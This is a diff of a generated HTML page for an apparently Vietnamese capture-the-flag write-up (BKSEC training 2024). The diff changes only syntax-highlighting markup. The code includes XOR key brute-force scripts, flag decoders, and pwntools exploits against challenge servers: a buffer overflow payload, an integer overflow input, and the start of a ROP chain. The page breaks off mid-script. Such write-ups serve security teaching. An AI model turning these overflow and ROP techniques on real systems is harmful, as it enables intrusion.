 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># brute-force to find key
-</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
 
-    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
-    <span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="nf">strip</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="n">strip</span><span class="p">()</span>
     <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
 
-    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
-        <span class="n">key</span><span class="p">[(</span><span class="n">pivot</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
-    <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">key</span><span class="p">[(</span><span class="n">pivot</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
     
-    <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>Từ đây, ta có được <code class="language-plaintext highlighter-rouge">key</code> và việc giải bài toán còn lại là hoàn toàn dễ dàng</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="n">base64</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">base64</span>
 
 <span class="c1"># brute-force to find len of key
 </span><span class="n">x</span> <span class="o">=</span> <span class="p">[]</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
 
-    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
 
     <span class="n">lenflag</span> <span class="o">=</span> <span class="mi">68</span> 
     <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-    <span class="n">x</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+    <span class="n">x</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
 
     <span class="c1"># print(data)
-</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">pivot </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+</span>    <span class="k">print</span><span class="p">(</span><span class="s">"pivot "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
     <span class="c1"># p.close()
 </span>
-<span class="n">x</span><span class="p">.</span><span class="nf">sort</span><span class="p">()</span>
-<span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">x</span><span class="p">.</span><span class="n">sort</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
 
 <span class="n">lenflag</span> <span class="o">=</span> <span class="mi">68</span>
 <span class="n">lenkey</span> <span class="o">=</span> <span class="mi">50</span> 
-<span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">Q</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">k</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">t</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">T</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">R</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">U</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">N</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="sh">''</span><span class="p">]</span> <span class="o">*</span> <span class="mi">60</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="s">'Q'</span><span class="p">,</span> <span class="s">'k'</span><span class="p">,</span> <span class="s">'t'</span><span class="p">,</span> <span class="s">'T'</span><span class="p">,</span> <span class="s">'R'</span><span class="p">,</span> <span class="s">'U'</span><span class="p">,</span> <span class="s">'N'</span><span class="p">,</span> <span class="s">'7'</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="s">''</span><span class="p">]</span> <span class="o">*</span> <span class="mi">60</span>
 <span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">50</span>
 
 <span class="c1"># brute-force to find key
-</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
 
-    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
-    <span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="nf">strip</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="n">strip</span><span class="p">()</span>
     <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
 
-    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
-        <span class="n">key</span><span class="p">[(</span><span class="n">pivot</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
-    <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">key</span><span class="p">[(</span><span class="n">pivot</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
     
-    <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
 
 <span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">73</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">33</span><span class="p">]</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
 
-<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
-<span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="nf">strip</span><span class="p">()</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="n">strip</span><span class="p">()</span>
 <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">decoded</span> <span class="o">=</span> <span class="sh">''</span>
+<span class="n">decoded</span> <span class="o">=</span> <span class="s">''</span>
 
 <span class="n">i</span> <span class="o">=</span> <span class="n">pivot</span>
 <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">encoded</span><span class="p">:</span>
-    <span class="n">decoded</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">50</span><span class="p">])</span>
+    <span class="n">decoded</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">50</span><span class="p">])</span>
     <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
     <span class="n">i</span> <span class="o">%=</span> <span class="mi">50</span>
 
-<span class="nf">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">decoded</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">decoded</span><span class="p">))</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="c1"># BKSEC{W0vv_1_d0nt_th1nk_y0u_c4n_r3c0v3r_my_m3554g3}
 </span></code></pre></div></div>
 <h2 id="reversebaby-ida-1">
@@ -879,8 +879,8 @@
 </li>
 </ul>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flag</span> <span class="o">=</span> <span class="sh">"</span><span class="s">BKSEC{rev3r5e_r@t</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">})12387642t234g789_UaD_t3h_@Uhc}eheh_n0ul_1Uv_Al_</span><span class="sh">"</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flag</span> <span class="o">=</span> <span class="s">"BKSEC{rev3r5e_r@t"</span> <span class="o">+</span> <span class="s">"})12387642t234g789_UaD_t3h_@Uhc}eheh_n0ul_1Uv_Al_"</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 <span class="c1"># BKSEC{rev3r5e_r@t_lA_vU1_lu0n_hehe}chU@_h3t_DaU_987g432t24678321)}
 </span></code></pre></div></div>
 <h2 id="reversebabyrust">
@@ -934,7 +934,7 @@
 <span class="n">flag</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4B</span>
 <span class="n">flag</span><span class="p">[</span><span class="mh">0xB</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6D</span>
 
-<span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">]))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">]))</span>
 <span class="c1"># BKSEC{w3lC0mE_tO_R3v}
 </span></code></pre></div></div>
 <h2 id="reversebabylua">
@@ -1026,17 +1026,17 @@ flag.lua: Lua bytecode, version 5.3
 <p>Kết thúc quá trình, ta thu được <code class="language-plaintext highlighter-rouge">encrypted_arr</code>. Đem so sánh <code class="language-plaintext highlighter-rouge">encrypted_arr</code> và <code class="language-plaintext highlighter-rouge">check_arr</code>, nếu 2 mảng bằng nhau hàm <code class="language-plaintext highlighter-rouge">check()</code> sẽ trả về kết quả đúng.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ans</span> <span class="o">=</span> <span class="p">[</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">133</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">166</span><span class="p">,</span> <span class="mi">157</span><span class="p">,</span> <span class="mi">189</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">172</span><span class="p">,</span> <span class="mi">155</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">154</span><span class="p">,</span> <span class="mi">168</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">94</span> <span class="p">]</span>
-<span class="n">key</span> <span class="o">=</span> <span class="sh">"</span><span class="s">ThisIsAFlag</span><span class="sh">"</span>
+<span class="n">key</span> <span class="o">=</span> <span class="s">"ThisIsAFlag"</span>
 
-<span class="n">flag</span> <span class="o">=</span> <span class="sh">""</span> 
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">ans</span><span class="p">)):</span> 
+<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span> 
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ans</span><span class="p">)):</span> 
     <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> 
-        <span class="n">flag</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span>
+        <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="n">k</span> <span class="o">=</span> <span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="nf">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]))</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span>
-        <span class="n">flag</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+        <span class="n">k</span> <span class="o">=</span> <span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]))</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span>
+        <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
 
-<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 <span class="c1"># BKSEC{ju$t_h@rd3r_2_re@d_:P}
 </span></code></pre></div></div>
     <!-- <h2 id="table-of-content">Table of Content</h2>
@@ -1104,16 +1104,16 @@ flag.lua: Lua bytecode, version 5.3
 <p><img src="/images/bktrain2024/image.png" alt="alt text" /></p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./bof_1</span><span class="sh">"</span><span class="p">)</span>
-<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
-<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6001</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./bof_1"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">6001</span><span class="p">)</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="o">*</span><span class="mi">76</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x13141516</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span><span class="o">*</span><span class="mi">76</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x13141516</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'number: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>:triangular_flag_on_post: <strong>BKSEC{\xBuffer\xOv3rfl0w\x1s\xchiLL}</strong></p>
@@ -1184,14 +1184,14 @@ flag.lua: Lua bytecode, version 5.3
 <p><img src="/images/bktrain2024/image-7.png" alt="alt text" /></p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3 
-</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6051</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">6051</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">2147483647</span><span class="sh">'</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">10</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'number: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2147483647'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'number: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'10'</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="c1"># BKSEC{Ma7h_1s_7hE_woR57_thIn6_EveR}
 </span></code></pre></div></div>
 
@@ -1238,20 +1238,20 @@ flag.lua: Lua bytecode, version 5.3
 <p><img src="/images/bktrain2024/image-4.png" alt="alt text" /></p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./bof_2</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./bof_2"</span><span class="p">)</span>
 <span class="c1"># p = process(elf.path) 
-</span><span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6011</span><span class="p">)</span>
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">6011</span><span class="p">)</span>
 
 <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00000000004011e5</span>
 <span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x00000000004011ee</span>
 <span class="n">ret</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
 
